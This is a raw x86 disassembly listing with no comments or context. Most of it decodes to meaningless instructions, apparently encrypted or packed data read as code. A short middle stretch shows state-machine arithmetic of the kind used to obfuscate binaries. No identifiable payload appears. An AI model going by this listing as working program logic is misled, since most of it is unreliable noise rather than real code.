  416a69:	push   0x42
  416a6b:	imul   ebp,DWORD PTR [esp+ebp*4],0x65
  416a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a70:	cld    
  416a71:	mov    bh,0xed
  416a73:	sahf   
  416a74:	popf   
  416a75:	cmp    DWORD PTR [edi-0x1b],esp
  416a78:	push   es
  416a79:	addr16 add eax,0xb76dbe73
  416a7f:	and    esi,DWORD PTR [eax+ecx*1]
  416a82:	xor    ebp,edx
  416a84:	bound  edx,QWORD PTR [esi-0x7c5b96a9]
  416a8a:	aas    
  416a8b:	mov    dl,BYTE PTR [edx-0x34]
  416a8e:	clc    
  416a8f:	arpl   WORD PTR [eax+0x6771f265],bp
  416a95:	test   DWORD PTR [ecx+edx*8-0x4e989856],0x598acc99
  416aa0:	adc    BYTE PTR [ebx+0x5],0x9b
  416aa4:	fistp  QWORD PTR [ebx+0x68]
  416aa7:	and    al,0xa8
  416aa9:	in     al,dx
  416aaa:	loopne 0x416acd
  416aac:	aam    0x6f
  416aae:	jmp    0xfee6:0x8ce74a82
  416ab5:	push   0x6b11d02f
  416aba:	ds mov bl,0x10
  416abd:	sub    DWORD PTR [ebx],esi
  416abf:	jp     0x416aba
  416ac1:	je     0x416a99
  416ac3:	and    BYTE PTR [edi-0x21],ah
  416ac6:	sub    edx,DWORD PTR [edx+0xd]
  416ac9:	int    0x78
  416acb:	cmp    al,0xec
  416acd:	lods   al,BYTE PTR ds:[esi]
  416ace:	inc    edi
  416acf:	aas    
  416ad0:	mov    bl,0x6d
  416ad2:	jg     0x416af7
  416ad4:	add    al,BYTE PTR [ebp-0x70]
  416ad7:	(bad)  
  416ad8:	mov    ecx,0xc963d662
  416add:	call   0x88b7f2d1
  416ae2:	rol    eax,cl
  416ae4:	cmp    eax,0xa377da07
  416ae9:	cli    
  416aea:	pushf  
  416aeb:	sbb    ebx,DWORD PTR [edx-0x368ef92]
  416af1:	pusha  
  416af2:	adc    ch,BYTE PTR [eax]
  416af4:	or     eax,0x7e1756a5
  416af9:	add    ebp,ecx
  416afb:	mov    dh,0x61
  416afd:	cli    
  416afe:	cmp    edx,edi
  416b00:	push   esi
  416b01:	inc    edx
  416b02:	sti    
  416b03:	mov    bl,0xb3
  416b05:	loope  0x416b22
  416b07:	in     al,0x5d
  416b09:	adc    edx,DWORD PTR [ecx-0x637b3e45]
  416b0f:	push   ds
  416b10:	cwde   
  416b11:	push   0xc852def3
  416b16:	retf   
  416b17:	je     0x416b8f
  416b19:	test   al,0xb1
  416b1b:	jnp    0x416b0d
  416b1d:	daa    
  416b1e:	push   0x2848ccf2
  416b23:	cli    
  416b24:	adc    ecx,DWORD PTR [ecx-0x390a32d5]
  416b2a:	adc    ecx,edx
  416b2c:	cwde   
  416b2d:	push   ebx
  416b2e:	mov    ds,WORD PTR [eax]
  416b30:	add    ch,BYTE PTR [edi+edi*1]
  416b33:	out    0xff,eax
  416b35:	and    al,0x1c
  416b38:	sbb    bl,ch
  416b3a:	rcl    BYTE PTR [ebx-0x4d5efcb7],cl
  416b40:	or     al,0x2b
  416b42:	mov    ah,0xa3
  416b44:	es jno 0x416b6a
  416b47:	lods   al,BYTE PTR ds:[esi]
  416b48:	or     BYTE PTR [ecx+0x4191f9f3],dl
  416b4e:	test   DWORD PTR [eax],eax
  416b50:	out    dx,al
  416b51:	dec    edi
  416b52:	loope  0x416bb9
  416b54:	ds shl BYTE PTR es:[ebx-0x5ac66365],cl
  416b5c:	jo     0x416b83
  416b5e:	cmp    BYTE PTR [edi+eax*2],cl
  416b61:	test   al,0xe
  416b63:	loope  0x416be0
  416b65:	(bad)  
  416b67:	dec    esp
  416b68:	test   BYTE PTR [esi-0x40406fc9],bl
  416b6e:	jno    0x416b1e
  416b70:	adc    ch,BYTE PTR [ecx+0x225668c9]
  416b76:	push   ebx
  416b77:	push   DWORD PTR ds:0x678954e6
  416b7d:	in     eax,0x26
  416b7f:	jbe    0x416bb1
  416b81:	fwait
  416b82:	mov    WORD PTR [esp+eiz*4-0x23a5b790],cs
  416b89:	xor    BYTE PTR [esi+0x18],dh
  416b8c:	sbb    BYTE PTR [edx+0x47],ah
  416b8f:	lock xchg ebx,eax
  416b91:	adc    bl,dh
  416b93:	pop    esp
  416b94:	inc    eax
  416b95:	cmp    ch,BYTE PTR [ebp-0x779602c5]
  416b9b:	int3   
  416b9c:	loope  0x416bff
  416b9e:	in     eax,dx
  416b9f:	add    eax,0x638748fe
  416ba4:	push   ebx
  416ba5:	fs inc ecx
  416ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba9:	xchg   DWORD PTR [ecx+0x1e],eax
  416bac:	ds add eax,0xb5714fa0
  416bb2:	rol    DWORD PTR [ecx-0x5d84b11d],cl
  416bb8:	test   eax,0xfab74e37
  416bbd:	gs rcr ah,cl
  416bc0:	dec    ebx
  416bc1:	call   0x28a81a01
  416bc6:	into   
  416bc7:	mov    eax,ds:0x53b8da90
  416bcc:	adc    eax,0x634b87e2
  416bd1:	add    eax,0x88e06708
  416bd6:	jle    0x416b5b
  416bd8:	(bad)  
  416bd9:	xchg   ebx,eax
  416bda:	jmp    0xe5db0034
  416bdf:	pop    esp
  416be0:	mov    cl,0x85
  416be2:	jb     0x416b70
  416be4:	sub    al,BYTE PTR es:[edx+0x2c45f2a7]
  416beb:	mov    al,0x8d
  416bed:	stos   BYTE PTR es:[edi],al
  416bee:	mov    ds:0xee39959b,eax
  416bf3:	xor    DWORD PTR [eax+0x2],ecx
  416bf6:	xchg   DWORD PTR [edx+0x37],esp
  416bf9:	jns    0x416ba8
  416bfb:	or     al,0x79
  416bfd:	inc    ebx
  416bfe:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416c00:	and    ch,dh
  416c02:	and    al,0x3e
  416c04:	mov    cl,0xa
  416c06:	nop
  416c07:	mov    edi,0x8c4f9b0e
  416c0c:	nop
  416c0d:	cdq    
  416c0e:	inc    esi
  416c0f:	xchg   ebx,eax
  416c10:	js     0x416bdb
  416c12:	sub    eax,0x5da0c5fa
  416c17:	nop
  416c18:	adc    al,0x46
  416c1a:	cmc    
  416c1b:	mov    al,0x26
  416c1d:	lods   al,BYTE PTR ds:[esi]
  416c1e:	xor    DWORD PTR [ecx+0x39],ebp
  416c21:	sub    al,0xf8
  416c23:	imul   ecx,esi,0xdfa486c3
  416c29:	popa   
  416c2a:	sub    DWORD PTR [eax],ebx
  416c2c:	mov    cs,WORD PTR ds:0x49c5d756
  416c32:	cmp    eax,0xe0f8075b
  416c37:	sub    al,0x3c
  416c39:	mov    ds:0xb9860a01,al
  416c3e:	out    0x56,al
  416c40:	inc    ebx
  416c41:	cmp    ebp,DWORD PTR [ebp-0x4789d6fe]
  416c47:	sar    BYTE PTR [ebp-0x130ccbd],cl
  416c4d:	fsubr  DWORD PTR [ecx-0x7f]
  416c50:	enter  0xc592,0x37
  416c54:	jg     0x416bf1
  416c56:	cmp    al,0x49
  416c58:	and    BYTE PTR [ebp-0x5c374a56],cl
  416c5e:	fld    QWORD PTR [ebp-0x41e28259]
  416c64:	xor    BYTE PTR [ecx],bl
  416c66:	scas   eax,DWORD PTR es:[edi]
  416c67:	ret    0x9e13
  416c6a:	(bad)  
  416c6b:	aam    0x7
  416c6d:	jnp    0x416c24
  416c6f:	inc    al
  416c71:	inc    ecx
  416c72:	aad    0x7b
  416c74:	loope  0x416c43
  416c76:	ror    dh,0x2e
  416c79:	and    BYTE PTR ds:0x66cb6e32,dl
  416c7f:	les    esi,FWORD PTR [si]
  416c82:	mov    ds:0x53963f5d,al
  416c87:	es hlt 
  416c89:	jb     0x416c3a
  416c8b:	aam    0xa5
  416c8d:	std    
  416c8e:	xchg   esi,eax
  416c8f:	inc    edx
  416c90:	gs int3 
  416c92:	loop   0x416d05
  416c94:	mov    cl,0xf3
  416c96:	std    
  416c97:	dec    ecx
  416c98:	adc    DWORD PTR ds:0xbab2b114,0x45e31770
  416ca2:	push   esp
  416ca3:	jge    0x416c50
  416ca5:	inc    ebp
  416ca6:	jno    0x416cad
  416ca8:	jnp    0x416d21
  416caa:	fisttp QWORD PTR [edi-0x79bd7dac]
  416cb0:	xchg   edx,eax
  416cb1:	popf   
  416cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb3:	sahf   
  416cb4:	(bad)  
  416cb5:	cld    
  416cb6:	int    0xa5
  416cb8:	cmp    eax,0x7bc6723b
  416cbd:	adc    al,0x3
  416cbf:	jo     0x416cfc
  416cc1:	(bad)  
  416cc2:	ds stos DWORD PTR es:[edi],eax
  416cc4:	les    ebx,FWORD PTR [ebp-0x77]
  416cc7:	mov    edi,0xd9287a01
  416ccc:	pop    edx
  416ccd:	xor    eax,0x248748d1
  416cd2:	aad    0x49
  416cd4:	dec    eax
  416cd5:	fisub  DWORD PTR [esp+ecx*2+0x76]
  416cd9:	in     al,dx
  416cda:	inc    esi
  416cdb:	ins    BYTE PTR es:[edi],dx
  416cdc:	icebp  
  416cdd:	xor    esp,DWORD PTR [edx]
  416cdf:	add    WORD PTR [ebx-0x5a],cx
  416ce3:	sti    
  416ce4:	pop    edx
  416ce5:	outs   dx,BYTE PTR ds:[esi]
  416ce6:	pop    esp
  416ce7:	inc    ecx
  416ce8:	rcl    DWORD PTR [ebx+0x7b34e400],1
  416cee:	add    al,0xba
  416cf0:	mov    edx,0x2b4ce0d3
  416cf5:	cmc    
  416cf6:	jmp    0x416cc1
  416cf8:	push   0xed737f29
  416cfd:	adc    DWORD PTR [edx+0x4e],eax
  416d00:	xor    dl,BYTE PTR [eax]
  416d02:	loop   0x416d41
  416d04:	ins    DWORD PTR es:[edi],dx
  416d05:	icebp  
  416d06:	mov    edi,0x4e0d1af5
  416d0b:	adc    ebp,DWORD PTR [ebp-0x42]
  416d0e:	ins    DWORD PTR es:[edi],dx
  416d0f:	repnz jecxz 0x416d57
  416d12:	xor    cl,BYTE PTR cs:[esi-0x67775222]
  416d19:	data16 xlat BYTE PTR ds:[ebx]
  416d1b:	sub    ch,BYTE PTR [eax+0x1328f5cd]
  416d21:	std    
  416d22:	mov    al,es:0xfd7e8356
  416d28:	(bad)  
  416d29:	mov    al,0x87
  416d2b:	test   eax,0x1e725b0a
  416d30:	jns    0x416ce1
  416d32:	push   edi
  416d33:	inc    eax
  416d34:	push   eax
  416d35:	out    0xeb,eax
  416d37:	shl    BYTE PTR [edi+0x41],cl
  416d3a:	sub    DWORD PTR [edi+0x55ab25b5],ebp
  416d40:	jmp    DWORD PTR [eax-0x32a587cb]
  416d46:	jno    0x416cee
  416d48:	dec    ebp
  416d49:	sar    edi,0x22
  416d4c:	sub    al,0x89
  416d4e:	mov    ebx,0xeca90bf7
  416d53:	or     DWORD PTR [ebp+0x23d6fc4a],ebp
  416d59:	les    ebx,FWORD PTR gs:[ecx+0x54]
  416d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d5e:	gs xor eax,0x951d362
  416d64:	mov    ?,edx
  416d66:	push   cs
  416d67:	ins    DWORD PTR es:[edi],dx
  416d68:	sub    DWORD PTR [edi+0xa3de9b2],ebx
  416d6e:	xchg   esp,eax
  416d6f:	popa   
  416d70:	adc    eax,0x560df35b
  416d75:	sbb    esi,ebx
  416d77:	fs jecxz 0x416dd8
  416d7a:	fild   DWORD PTR [ebx+edi*4]
  416d7d:	dec    ecx
  416d7e:	mov    al,BYTE PTR ds:0x2f053715
  416d84:	scas   al,BYTE PTR es:[edi]
  416d85:	dec    ebx
  416d86:	fstp   QWORD PTR [ecx+esi*2]
  416d89:	and    BYTE PTR ds:0x22499aab,ch
  416d8f:	jge    0x416d1c
  416d91:	push   ebp
  416d92:	or     BYTE PTR [ebx-0x2fcc07a3],cl
  416d98:	xor    ebx,eax
  416d9a:	sub    edx,ebx
  416d9c:	sub    edx,esi
  416d9e:	xor    edx,eax
  416da0:	mov    DWORD PTR [ebp+0x8],edx
  416da3:	mov    edx,DWORD PTR [ebp+0x8]
  416da6:	mov    ebx,DWORD PTR [ebp-0x58]
  416da9:	add    edx,0x5708fa
  416daf:	imul   edx,ebx
  416db2:	mov    DWORD PTR [ebp-0x58],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x54]
  416dbb:	add    edx,0x64f89c
  416dc1:	or     edx,ebx
  416dc3:	mov    DWORD PTR [ebp-0x54],edx
  416dc6:	mov    edx,DWORD PTR [ebp+0x8]
  416dc9:	mov    ebx,DWORD PTR [ebp-0x50]
  416dcc:	add    edx,ecx
  416dce:	xor    edx,ebx
  416dd0:	mov    DWORD PTR [ebp-0x50],edx
  416dd3:	mov    edx,DWORD PTR [ebp+0x8]
  416dd6:	mov    ebx,DWORD PTR [ebp-0x4c]
  416dd9:	add    edx,edi
  416ddb:	and    edx,ebx
  416ddd:	mov    DWORD PTR [ebp-0x4c],edx
  416de0:	mov    edx,DWORD PTR [ebp+0x8]
  416de3:	mov    ebx,DWORD PTR [ebp-0x48]
  416de6:	lea    edx,[ebx+edx*1+0x241fcdf]
  416ded:	mov    DWORD PTR [ebp-0x48],edx
  416df0:	mov    edx,DWORD PTR [ebp+0x8]
  416df3:	mov    ebx,0xfa5e1530
  416df8:	sub    ebx,edx
  416dfa:	add    ebx,DWORD PTR [ebp-0x44]
  416dfd:	mov    DWORD PTR [ebp-0x44],ebx
  416e00:	mov    edx,DWORD PTR [ebp+0x8]
  416e03:	xor    edx,eax
  416e05:	add    edx,esi
  416e07:	jne    0x416d90
  416e0d:	mov    edx,DWORD PTR [ebp-0x8]
  416e10:	mov    ebx,DWORD PTR [ebp-0xc]
  416e13:	xor    edx,eax
  416e15:	lea    edx,[edx+ebx*1+0x3272ef]
  416e1c:	mov    DWORD PTR [ebp-0xc],edx
  416e1f:	mov    edx,DWORD PTR [ebp-0x10]
  416e22:	xor    edx,eax
  416e24:	add    edx,esi
  416e26:	jne    0x4146af
  416e2c:	jmp    0x4192cb
  416e31:	mov    ecx,DWORD PTR [ebp-0x14]
  416e34:	mov    DWORD PTR [ebp+0x8],ecx
  416e37:	jmp    0x419238
  416e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  416e3f:	mov    edx,DWORD PTR [ebp-0x8]
  416e42:	xor    ecx,eax
  416e44:	xor    edx,eax
  416e46:	jmp    0x4191ce
  416e4b:	aam    0x6
  416e4d:	sbb    ah,BYTE PTR [ecx-0x4445a78]
  416e53:	test   eax,0xa78912f5
  416e58:	adc    al,0xf7
  416e5a:	cmc    
  416e5b:	fistp  QWORD PTR [ebx]
  416e5d:	jns    0x416ed9
  416e5f:	pop    ss
  416e60:	pop    edi
  416e61:	jp     0x416edd
  416e63:	inc    ecx
  416e64:	add    ebp,0x4db14ca5
  416e6a:	es je  0x416ebf
  416e6d:	xchg   esp,eax
  416e6e:	inc    eax
  416e6f:	out    0x87,eax
  416e71:	hlt    
  416e72:	clc    
  416e73:	push   ebp
  416e74:	xchg   esp,eax
  416e75:	(bad)  
  416e76:	jmp    0xbfd:0xf8625a5b
  416e7d:	shl    edi,cl
  416e7f:	adc    DWORD PTR [esi],esi
  416e81:	jnp    0x416ea7
  416e83:	adc    DWORD PTR [edi],ebx
  416e85:	stos   DWORD PTR es:[edi],eax
  416e86:	xchg   DWORD PTR [edx],esp
  416e88:	push   esi
  416e89:	scas   eax,DWORD PTR es:[edi]
  416e8a:	jmp    0x1f97:0x31ed65ea
  416e91:	add    BYTE PTR [ecx],bh
  416e93:	std    
  416e94:	push   cs
  416e95:	(bad)  
  416e96:	fsubr  QWORD PTR [ebp-0x76]
  416e99:	sub    dh,bl
  416e9b:	out    dx,eax
  416e9c:	adc    ecx,esp
  416e9e:	mov    BYTE PTR [edx],dh
  416ea0:	iret   
  416ea1:	sub    al,0x8d
  416ea3:	enter  0x719b,0xb7
  416ea7:	sub    ah,BYTE PTR [esi-0x602a01b1]
  416ead:	jp     0x416eb5
  416eaf:	in     eax,0x59
  416eb1:	fcmovb st,st(0)
  416eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb4:	test   eax,0x6a320669
  416eb9:	sbb    al,0x15
  416ebb:	aaa    
  416ebc:	jnp    0x416eaf
  416ebe:	aas    
  416ebf:	add    DWORD PTR [ecx],ebx
  416ec1:	sbb    al,0xbd
  416ec3:	leave  
  416ec4:	cmp    BYTE PTR [ebp+0x4f090ed0],al
  416eca:	push   esp
  416ecb:	and    esp,DWORD PTR [ebp+0x24]
  416ece:	ret    
  416ecf:	xlat   BYTE PTR ds:[ebx]
  416ed0:	int    0x7b
  416ed2:	mov    eax,0xc2881b2d
  416ed7:	fstp   QWORD PTR [eax-0x335c1981]
  416edd:	cmp    DWORD PTR [esi],edi
  416edf:	pop    ecx
  416ee0:	(bad)
  416ee3:	mov    ecx,0x4c80fd7
  416ee8:	imul   esp,DWORD PTR [ebx],0xffffffc6
  416eeb:	outs   dx,DWORD PTR ds:[esi]
  416eec:	add    al,0x5c
  416eee:	retf   0x9e5e
  416ef1:	data16 scas al,BYTE PTR es:[edi]
  416ef3:	rep outs dx,BYTE PTR ds:[esi]
  416ef5:	out    0xb4,al
  416ef7:	add    al,0x26
  416ef9:	adc    eax,0x856e40af
  416efe:	push   es
  416eff:	aad    0x64
  416f01:	mov    dh,bl
  416f03:	or     eax,0xf8c754f8
  416f08:	ins    DWORD PTR es:[edi],dx
  416f09:	dec    eax
  416f0a:	mov    esp,0x401a500e
  416f0f:	push   edx
  416f10:	mov    ds:0x7b658f45,al
  416f15:	xchg   DWORD PTR [eax-0x33],eax
  416f18:	xchg   ebp,eax
  416f19:	into   
  416f1a:	int3   
  416f1b:	mov    WORD PTR ds:0x2acda3ef,?
  416f21:	stos   BYTE PTR es:[edi],al
  416f22:	out    dx,eax
  416f23:	push   ss
  416f24:	fmul   QWORD PTR [edx]
  416f26:	out    dx,eax
  416f27:	cdq    
  416f28:	xchg   ecx,eax
  416f29:	rcl    BYTE PTR [eax],1
  416f2b:	cmp    esp,DWORD PTR [esi+0x1a4dab83]
  416f31:	test   BYTE PTR [esi],0x82
  416f34:	cmp    al,0x3e
  416f36:	out    dx,al
  416f37:	rol    cl,1
  416f39:	repz push cs
  416f3b:	push   ss
  416f3c:	mov    ch,BYTE PTR [ecx]
  416f3e:	ins    DWORD PTR es:[edi],dx
  416f3f:	call   0x6266162
  416f44:	and    al,cl
  416f46:	shr    DWORD PTR [esi+0x7a],0x18
  416f4a:	sbb    DWORD PTR [ecx+0x3],0x1cb940a
  416f51:	mov    WORD PTR [edx+0x353ea0f5],es
  416f57:	out    dx,al
  416f58:	and    dh,BYTE PTR [edx+edi*2+0x7102c1f7]
  416f5f:	xchg   ecx,eax
  416f60:	es jae 0x416f15
  416f63:	and    eax,0xc515abf7
  416f68:	shl    BYTE PTR [edi-0x4cc3b121],0x90
  416f6f:	xchg   ebx,eax
  416f70:	xor    al,BYTE PTR [ebp-0x44]
  416f73:	xor    eax,0x1b72730
  416f78:	mov    ah,0x5c
  416f7a:	pop    ebx
  416f7b:	or     edx,0xe
  416f7e:	mov    eax,ds:0xab32987
  416f83:	aaa    
  416f84:	je     0x416f28
  416f86:	retf   
  416f87:	pop    ds
  416f88:	stos   BYTE PTR es:[edi],al
  416f89:	dec    ebx
  416f8a:	shl    DWORD PTR [edx-0x5931fd95],cl
  416f90:	mov    eax,ds:0x41d17f0b
  416f95:	mov    ebp,0x59bc5000
  416f9a:	call   0x679e43d9
  416f9f:	sbb    bh,BYTE PTR [edx+0x7b317f7e]
  416fa5:	xchg   edi,eax
  416fa7:	js     0x41701d
  416fa9:	mov    bl,0xe0
  416fab:	pop    ss
  416fac:	mov    dh,ah
  416fae:	sub    DWORD PTR [ebx*4-0x299d489e],edi
  416fb5:	sti    
  416fb6:	fisttp QWORD PTR [ebp-0x21]
  416fb9:	or     BYTE PTR [esi+ebp*2-0x51508adc],ah
  416fc0:	mov    ds:0x2c5d34a3,eax
  416fc5:	pop    ecx
  416fc6:	push   esi
  416fc7:	scas   eax,DWORD PTR es:[edi]
  416fc8:	out    0xa6,eax
  416fca:	cmp    DWORD PTR [eax],ebp
  416fcc:	inc    ecx
  416fce:	jp     0x416fed
  416fd0:	sub    eax,0x3d646c90
  416fd5:	lahf   
  416fd6:	in     eax,0x1d
  416fd8:	push   es
  416fd9:	test   BYTE PTR ds:0x2d80bf8b,bh
  416fdf:	rcl    BYTE PTR [ecx+ebx*1+0x69a0b987],0x32
  416fe7:	lea    eax,[ebx]
  416fe9:	push   edx
  416fea:	push   0x2c
  416fec:	mov    ebx,0xd14443
  416ff1:	sbb    al,bl
  416ff3:	int3   
  416ff4:	cli    
  416ff5:	mov    bh,0x3d
  416ff7:	cmp    DWORD PTR [ebx-0x28],eax
  416ffa:	mov    eax,ds:0xa3cd9da7
  416fff:	xchg   esi,eax
  417000:	daa    
  417001:	mov    esp,0xdf469fe4
  417006:	mov    ds:0x3e68c156,al
  41700b:	push   edx
  41700c:	inc    esi
  41700d:	in     al,dx
  41700e:	cmp    BYTE PTR [eax+0x16a2f5a5],dl
  417014:	dec    ebp
  417015:	inc    edx
  417016:	daa    
  417017:	add    al,0xe2
  417019:	sub    eax,0x9e88e3ca
  41701e:	inc    edi
  41701f:	xchg   esi,eax
  417020:	add    eax,0xc57d0b33
  417025:	sbb    BYTE PTR [ecx],dl
  417027:	jbe    0x416fc3
  417029:	test   eax,0x3cec6675
  41702e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41702f:	adc    ebx,DWORD PTR [ebx]
  417031:	arpl   WORD PTR [ebp+0xcaf9a2f],bx
  417037:	fisttp DWORD PTR [ecx]
  417039:	lods   eax,DWORD PTR ds:[esi]
  41703a:	arpl   WORD PTR [eax],dx
  41703c:	data16 in al,dx
  41703e:	les    esi,FWORD PTR [edi]
  417040:	lods   al,BYTE PTR ds:[esi]
  417041:	lods   al,BYTE PTR ds:[esi]
  417042:	dec    ecx
  417043:	sub    ebp,DWORD PTR [esp+ecx*4+0x34]
  417047:	out    0x3e,al
  417049:	shl    al,0x3f
  41704c:	jecxz  0x41702c
  41704e:	adc    DWORD PTR [esp+edi*2-0x79922dfe],edx
  417055:	nop
  417056:	jns    0x4170c1
  417058:	cmp    BYTE PTR [ebp+0x5c],0x7b
  41705c:	fwait
  41705d:	out    0x2b,al
  41705f:	sbb    bl,ch
  417061:	jp     0x417050
  417063:	cmp    BYTE PTR [edi],cl
  417065:	stos   BYTE PTR es:[edi],al
  417066:	ret    0x33d7
  417069:	and    edx,DWORD PTR [edx]
  41706b:	jbe    0x417031
  41706d:	retf   
  41706e:	sub    BYTE PTR [ebx+0x23b97da0],bl
  417074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417075:	ins    DWORD PTR es:[edi],dx
  417076:	rcr    DWORD PTR [edi+0x72],0x2
  41707a:	push   esi
  41707b:	ins    DWORD PTR es:[edi],dx
  41707c:	sti    
  41707d:	push   eax
  41707e:	jae    0x41704c
  417080:	pop    eax
  417081:	inc    esp
  417082:	and    dl,BYTE PTR [esi+0x79]
  417085:	cmp    eax,DWORD PTR [edx+0x36a84a8d]
  41708b:	xchg   DWORD PTR [ecx],ebp
  41708d:	mov    BYTE PTR [esi+0x7c362bd0],dl
  417093:	push   ebp
  417094:	dec    eax
  417095:	fstp   DWORD PTR [edi+eax*4+0x14]
  417099:	outs   dx,DWORD PTR ds:[esi]
  41709a:	cmp    ebx,DWORD PTR [ebp-0x5e]
  41709d:	mov    ebx,0x99819523
  4170a2:	and    eax,0x1877debb
  4170a7:	sub    al,0x51
  4170a9:	push   ebp
  4170aa:	jecxz  0x417072
  4170ac:	cmc    
  4170ad:	mov    BYTE PTR [ecx+0x11ce2337],dl
  4170b3:	ds or  ebx,0x11
  4170b7:	inc    ecx
  4170b8:	sti    
  4170b9:	push   esp
  4170ba:	sbb    al,0x7e
  4170bc:	ds (bad) 
  4170be:	idiv   DWORD PTR [ebx-0x22]
  4170c1:	cld    
  4170c2:	rcl    DWORD PTR [esi+0x790bdf02],cl
  4170c8:	cld    
  4170c9:	xchg   ebx,eax
  4170ca:	jae    0x41709a
  4170cc:	mov    ebp,0xc9aa5096
  4170d1:	cwd    
  4170d3:	popf   
  4170d4:	sbb    al,0x24
  4170d6:	lods   eax,DWORD PTR ds:[esi]
  4170d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d8:	into   
  4170d9:	jnp    0x41709a
  4170db:	jl     0x4170a2
  4170dd:	jo     0x4170a5
  4170df:	and    al,0xf2
  4170e1:	jl     0x417122
  4170e3:	push   eax
  4170e4:	fs mov edx,0x62d7866a
  4170ea:	outs   dx,BYTE PTR ds:[esi]
  4170eb:	push   ebx
  4170ec:	cmp    bl,BYTE PTR ds:0x411c3122
  4170f2:	dec    ebp
  4170f3:	push   ecx
  4170f4:	pop    ecx
  4170f5:	push   0x3a
  4170f7:	and    BYTE PTR [edx],ch
  4170f9:	imul   ebp,esp,0x52
  4170fc:	cmp    DWORD PTR [ebx-0xc],0xfdfe3b3a
  417103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417104:	inc    edx
  417105:	(bad)  
  417106:	sbb    dl,al
  417108:	call   0x86135f15
  41710d:	mov    ds:0xb783ef7b,al
  417112:	outs   dx,DWORD PTR ds:[esi]
  417113:	jmp    0xe151895e
  417118:	push   edx
  417119:	out    0xba,al
  41711b:	xor    al,0x16
  41711d:	popa   
  41711e:	mov    bl,BYTE PTR [ecx]
  417120:	leave  
  417121:	mov    edi,0xe5dae0bc
  417126:	popf   
  417127:	outs   dx,DWORD PTR ds:[esi]
  417128:	jmp    0x9a28:0x4a5020b
  41712f:	into   
  417130:	loopne 0x417159
  417132:	test   al,0x3d
  417134:	mov    ds:0xf34dead9,eax
  417139:	push   ecx
  41713a:	dec    esp
  41713b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41713c:	cmp    DWORD PTR [edi],0xa
  41713f:	sbb    BYTE PTR [eax+0x45a7e824],cl
  417145:	dec    ebx
  417146:	dec    ebp
  417147:	dec    ecx
  417148:	call   0x400cf02b
  41714d:	push   ebp
  41714e:	call   0x1754:0xfb4b5f75
  417155:	add    eax,0x32e5951e
  41715a:	adc    bl,BYTE PTR [edi+0x788d54d6]
  417160:	aam    0x2c
  417162:	lock jmp 0x417151
  417165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417166:	cmp    eax,0x193a39d7
  41716b:	ja     0x417195
  41716d:	stos   DWORD PTR es:[edi],eax
  41716e:	lock push ds
  417170:	inc    esp
  417171:	jo     0x41714c
  417173:	jno    0x417106
  417175:	dec    esi
  417176:	dec    ebp
  417177:	pop    ebx
  417178:	sbb    ecx,DWORD PTR [edx-0x62]
  41717b:	repz adc eax,0x95d9b531
  417182:	jns    0x417165
  417184:	xchg   ecx,eax
  417185:	shl    BYTE PTR [ecx],1
  417187:	ret    0xe944
  41718a:	mov    bh,0xb6
  41718c:	in     eax,dx
  41718d:	loopne 0x41715c
  41718f:	jns    0x41713b
  417191:	cdq    
  417192:	mov    al,0x15
  417194:	aad    0xe6
  417196:	xor    DWORD PTR [edx+0x2bb96a38],esi
  41719c:	test   eax,0x302a22f4
  4171a1:	push   ss
  4171a2:	ss fwait
  4171a4:	push   ecx
  4171a5:	and    ecx,DWORD PTR [eax-0xc5d6ae3]
  4171ab:	jp     0x4171f1
  4171ad:	pop    ds
  4171ae:	mov    cl,0x2d
  4171b0:	adc    eax,0xe31a2e58
  4171b5:	pushf  
  4171b6:	es push esp
  4171b8:	cmp    al,0x38
  4171ba:	les    edi,FWORD PTR [esi+0x23]
  4171bd:	cmp    al,0x6
  4171bf:	mov    BYTE PTR [esi+0xd],bh
  4171c2:	mov    eax,0x5f1550bc
  4171c7:	and    BYTE PTR [esi-0x4d323147],dl
  4171cd:	and    BYTE PTR [esi-0x35],bl
  4171d0:	xchg   ebx,eax
  4171d1:	(bad)  
  4171d2:	dec    esp
  4171d3:	pop    ss
  4171d4:	xor    DWORD PTR [esi+0x40cb1257],ebp
  4171da:	mov    WORD PTR [esi-0x60],cs
  4171dd:	jg     0x4171fe
  4171df:	aaa    
  4171e0:	dec    ebp
  4171e1:	aad    0x89
  4171e3:	or     eax,0x356a2aa
  4171e8:	cmp    DWORD PTR [ecx+0x7b6c3b45],ebp
  4171ee:	and    al,0xc0
  4171f0:	mov    ds:0xb2201b29,al
  4171f5:	inc    esi
  4171f6:	jmp    0x417229
  4171f8:	fstp   QWORD PTR [edi-0x73]
  4171fb:	(bad)  
  4171fd:	mov    al,ds:0x9cfe7881
  417202:	jne    0x4171d9
  417204:	clc    
  417205:	mov    ah,BYTE PTR [ebx]
  417207:	ror    edi,cl
  417209:	push   edx
  41720a:	mov    ecx,0xe5613d10
  41720f:	mov    esi,0xe9bbe732
  417214:	inc    edi
  417215:	hlt    
  417216:	mov    edi,0x8bdd6f31
  41721b:	sbb    DWORD PTR [ecx+0x3d],0xffffffe4
  41721f:	cmp    DWORD PTR [edi+eax*8-0x67a7eddf],edx
  417226:	mov    cl,0x36
  417228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417229:	mov    al,0xc7
  41722b:	adc    bh,BYTE PTR [edx+0x2ee1c94b]
  417231:	or     DWORD PTR [ebp-0x30],ebx
  417234:	fcomp  DWORD PTR [esi]
  417236:	cli    
  417237:	mov    eax,ds:0x857308ee
  41723c:	js     0x417243
  41723e:	xchg   edx,eax
  41723f:	mov    edi,0xf6bcf33d
  417244:	or     eax,0x6644b308
  417249:	test   BYTE PTR [esi-0x60],bl
  41724c:	enter  0xdb24,0xc7
